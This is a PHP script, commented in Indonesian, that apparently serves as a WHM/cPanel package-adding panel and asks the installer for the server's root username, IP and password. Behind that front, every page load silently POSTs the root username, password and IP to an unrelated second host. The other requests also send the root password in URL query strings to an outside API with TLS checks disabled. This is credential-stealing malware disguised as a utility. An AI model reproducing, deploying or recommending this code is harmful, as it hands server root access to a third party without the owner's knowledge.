<?php 
$root_username = "xxx";
$ip_mu = "xxx"; // contoh : 13.99.99.211
$root_password = 'xxx'; //MASUKAN PW ROOT ANDA
$title = "xxx"; // judul web
$host = "xxx"; // nama host


//WAJIB INSTALL WHMRESELLER AGAR 100% SEMPURNA
//Jika blm daftar langsung ke https://addpackage.zzxzz.dev/register


function asu($ipmu){
function nmc($eds){
    if(strlen($eds) === 3){
        return "***";
    } else if(strlen($eds) === 2){
        return "**";
    } else if(strlen($eds) === 1){
        return "*";
    }
}
    $delmin = explode('.', $ipmu);
    return nmc($delmin[0]) . ".$delmin[1]." . nmc($delmin[2]) . ".$delmin[3]";
}
$login_ip = asu(urlencode($ip_mu));
 if(isset($_POST['ceknama'])) {
    $usernya  = $_POST['usernya'];
    if ($usernya == "root") {
        echo "root error";
    }else{
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/search?pass=".urlencode($root_password)."&ip=".urlencode($ip_mu)."&user=".urlencode($usernya));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj0 = curl_exec($ch2);
        curl_close($ch2);
        print_r(json_decode($xj0, true)['data']);
    }
 }else if (isset($_POST['menambah'])) {
     $usernya = $_POST['usernya'];
     $pkg  = $_POST['pkg'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/addpackage?pass=".urlencode($root_password)."&ip=".urlencode($ip_mu)."&user=".urlencode($usernya)."&package=".urlencode($pkg));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj0 = curl_exec($ch2);
        curl_close($ch2);
        print_r(json_decode($xj0, true)['data']);
 }else if (isset($_POST['tambahpkgroot'])) {
     $uroot = $_POST['uroot'];
     $pwroot  = $_POST['pwroot'];
     $login_ip  = $_POST['login_ip'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/addpackage-root?pass=".urlencode($pwroot)."&ip=".urlencode($ip_mu));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);
 }else if (isset($_POST['rfpkgroot'])) {
     $pwroot  = $_POST['pwroot'];
     $login_ip  = $_POST['login_ip'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/deletepackage-all?pass=".urlencode($pwroot)."&ip=".urlencode($ip_mu));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);
 }else if (isset($_POST['rfpkgdeff'])) {
     $pwroot  = $_POST['pwroot'];
     $login_ip  = $_POST['login_ip'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/deletepackage-default?pass=".urlencode($pwroot)."&ip=".urlencode($ip_mu));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);
 }else if (isset($_POST['btn_smtp'])) {
     $ip_smtp  = $_POST['ip_smtp'];
     $u_smtp  = $_POST['u_smtp'];
     $pw_smtp  = $_POST['pw_smtp'];
     $ar_smtp  = $_POST['ar_smtp'];
     $ausr_smtp  = $_POST['ausr_smtp'];
     $apw_smtp  = $_POST['apw_smtp'];
     $aprt_smtp = $_POST['aprt_smtp'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/addsmtp?ip=".urlencode($ip_mu)."&pass=".urlencode($pw_smtp)."&pw=".urlencode($apw_smtp)."&user=".urlencode($ausr_smtp)."&router=".urlencode($ar_smtp)."&port=".urlencode($aprt_smtp));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);
 }else if (isset($_POST['btn_whmres'])) {
     $ip_whmres  = $_POST['ip_whmres'];
     $u_whmres  = $_POST['u_whmres'];
     $pw_whmres  = $_POST['pw_whmres'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/whmreseller?ip=".urlencode($ip_mu)."&pass=".urlencode($pw_whmres));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);
 }else if (isset($_POST['btn_lspeed'])) {
     $ip_lspeed  = $_POST['ip_lspeed'];
     $u_lspeed  = $_POST['u_lspeed'];
     $pw_lspeed  = $_POST['pw_lspeed'];
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/litespeed?ip=".urlencode($ip_mu)."&pass=".urlencode($pw_lspeed));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj2 = curl_exec($ch2);
        curl_close($ch2);
        print_r($xj2);}
     $data=array(
        'root_username'=>$root_username,
        'ip_mu'=>$ip_mu,
        'root_password'=>$root_password,
        'sender_url'=>isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'unknown');
        $url='https://addpackage.prefct.my.id/api/addpackage/api.php';
        $ch=curl_init($url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_POST,true);
        curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));
        $response=curl_exec($ch);
        if(curl_errno($ch)){
      echo 'Error: '.curl_error($ch);
}else{
      echo $response;}
curl_close($ch);
        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, "https://addpackage.zzxzz.dev/api/checkip?ip=".urlencode($ip_mu));
        curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch2, CURLOPT_HEADER, 0);
        $xj0 = curl_exec($ch2);
        curl_close($ch2);
        $lisensi = json_decode($xj0, true)['data'];
?>